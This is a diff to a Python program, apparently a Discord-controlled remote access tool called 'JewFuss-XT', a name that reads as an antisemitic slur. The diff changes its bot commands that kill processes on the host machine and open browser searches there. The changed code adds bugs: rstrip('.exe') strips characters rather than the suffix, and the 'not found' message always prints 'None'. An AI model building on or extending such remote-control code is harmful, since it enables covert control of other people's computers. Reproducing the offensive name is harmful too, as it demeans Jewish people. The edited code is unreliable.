@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.11" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.12" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 intents = discord.Intents.all()
 
@@ -2062,18 +2062,22 @@ async def kill(ctx, arg: str = ""):
         process.terminate() 
         await ctx.send(f"Task with PID {pid} has been terminated!")
     except ValueError:
+        
         terminated = 0
+        firstProcName = "None"
         for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] == arg:
+            if proc.info['name'].lower().rstrip(".exe") == arg.lower().rstrip(".exe"):
                 try:
                     psutil.Process(proc.info['pid']).terminate()
+                    firstProcName = proc.info['name']
                     terminated += 1
                 except psutil.NoSuchProcess:
                     pass
+                        
         if terminated > 0:
-            await ctx.send(f"Terminated {terminated} processes with the name {arg}.")
+            await ctx.send(f"Terminated **{terminated}** processes with the name `{arg}`")
         else:
-            await ctx.send(f"No processes with the name {arg} found.")
+            await ctx.send(f"No processes with the name `{firstProcName}` found.")
     except Exception as e:
         await ctx.send(f"Error terminating task: {str(e)}")
 
@@ -2090,7 +2094,7 @@ async def google(ctx, *, q: str):
     try:
         url = f"https://www.google.com/search?q=" + q.replace('"', '\\"').replace(" ", "+")
         webbrowser.open(url)
-        await ctx.send(f"Googled {q}")
+        await ctx.send(f"Googled `{q}`")
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
